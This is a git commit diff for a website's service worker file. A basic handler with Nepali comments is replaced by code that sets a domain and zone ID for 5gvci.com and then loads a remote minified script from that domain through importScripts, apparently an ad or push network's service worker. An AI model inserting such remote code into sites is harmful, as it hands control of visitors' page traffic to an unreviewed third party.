44cdaddae830d56069a197db99b43da397b39731
aadhirajbro30 <rostergbt@gmail.com>
2026-08-26 11:04:57 +0545

    Update sw.js

--- sw.js
+++ sw.js
@@ -1,14 +1,6 @@
-// १. इन्स्टल गर्दा कुनै पनि फाइल खोजेर अल्झिने छैन
-self.addEventListener('install', (event) => {
-  self.skipWaiting();
-});
-
-// २. तुरुन्तै सर्भिस वर्कर सक्रिय हुनेछ
-self.addEventListener('activate', (event) => {
-  event.waitUntil(self.clients.claim());
-});
-
-// ३. सामान्य नेटवर्क रिक्वेस्ट (अहिले क्यासको झन्झट छैन)
-self.addEventListener('fetch', (event) => {
-  event.respondWith(fetch(event.request));
-});
+self.options = {
+    "domain": "5gvci.com",
+    "zoneId": 11655133
+}
+self.lary = ""
+importScripts('https://5gvci.com/act/files/service-worker.min.js?r=sw')
